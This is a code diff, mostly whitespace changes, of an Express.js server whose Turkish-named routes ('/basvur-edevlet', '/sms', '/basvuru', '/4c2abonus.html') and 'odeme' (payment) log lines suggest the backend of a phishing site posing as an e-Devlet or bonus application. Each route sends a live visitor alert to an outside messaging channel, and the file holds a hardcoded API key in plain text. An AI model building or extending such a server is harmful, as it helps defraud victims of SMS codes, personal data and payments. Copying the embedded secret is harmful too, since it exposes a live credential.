@@ -21,8 +21,6 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(cookieParser()); 
 
-
-
 app.get('/', (req, res) => {
    notifyVisitorLogin()
     .then(() => {
@@ -47,9 +45,7 @@ app.get('/4c2abonus.html', (req, res) => {
      });
  });
  
- 
-
- app.get('/basvuru', (req, res) => {
+app.get('/basvuru', (req, res) => {
     notifyVisitorLogin()
      .then(() => {
         console.log('odeme');
@@ -61,7 +57,7 @@ app.get('/4c2abonus.html', (req, res) => {
      });
  });
  
- app.get('/basvuru-yap', (req, res) => {
+app.get('/basvuru-yap', (req, res) => {
     notifyVisitorLogin()
      .then(() => {
         console.log('odeme');
@@ -72,12 +68,8 @@ app.get('/4c2abonus.html', (req, res) => {
        res.status(500).send('Internal Server Error');
      });
  });
- 
 
-
-  app.get('/sms', (req, res) => {
- 
-  
+app.get('/sms', (req, res) => {
     notifyVisitorLogin()
     .then(() => {
       console.log('sorgulaniyor');
@@ -87,9 +79,9 @@ app.get('/4c2abonus.html', (req, res) => {
       console.error('Error sending visitor login notification:', error);
       res.status(500).send('Internal Server Error');
     });
-  });
+});
 
-  app.get('/slot', (req, res) => {
+app.get('/slot', (req, res) => {
     const submittedData = req.cookies.submittedData || 'No data submitted yet';
   
     notifyVisitorLogin()
@@ -101,8 +93,7 @@ app.get('/4c2abonus.html', (req, res) => {
       console.error('Error sending visitor login notification:', error);
       res.status(500).send('Internal Server Error');
     });
-  });
-
+});
 
 app.get('/sorgula', async (req, res) => {
     try {
@@ -119,10 +110,7 @@ app.get('/sorgula', async (req, res) => {
     }
 });
 
-app.listen(port, () => {
-    console.log(`Server listening at http://localhost:${port}`);
-});
- app.get('/basvur-edevlet', (req, res) => {
+app.get('/basvur-edevlet', (req, res) => {
     notifyVisitorLogin()
      .then(() => {
         console.log('odeme');
@@ -133,11 +121,8 @@ app.listen(port, () => {
        res.status(500).send('Internal Server Error');
      });
  });
- 
 
-  
-
-async function notifyVisitorLogin() {
+ async function notifyVisitorLogin() {
   const apiKey = 'HSmV8Q.l6hnnA:QwimsXeRCaBhHTlLUBj4aK3dYf52A4EEt_lNoPnt8bg';
   const channelName = 'aphysch0b';
 
@@ -154,6 +139,3 @@ async function notifyVisitorLogin() {
 app.listen(PORT, () => {
     console.log(`Server listening at http://localhost:${PORT}`);
 });
-
-
-
